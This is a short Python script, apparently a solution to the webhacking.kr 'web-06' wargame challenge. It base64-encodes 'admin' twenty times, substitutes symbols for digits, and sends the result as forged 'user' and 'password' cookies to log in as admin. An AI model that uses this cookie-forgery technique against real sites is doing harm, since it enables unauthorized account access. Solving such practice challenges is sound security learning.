import base64
from Solution.webhacking.basic import login


def replace_to(string: str):
    pattern = '_!@$^&*()'
    for i in range(1, 9):
        string = string.replace(str(i), pattern[i])
    return string


val = 'admin'
for i in range(20):
    val = base64.b64encode(val.encode()).decode()
val = replace_to(val)

cookies = {
    'user': val,
    'password': val
}

s = login()
print(s.get('http://webhacking.kr/challenge/web/web-06/index.php', cookies=cookies).text)
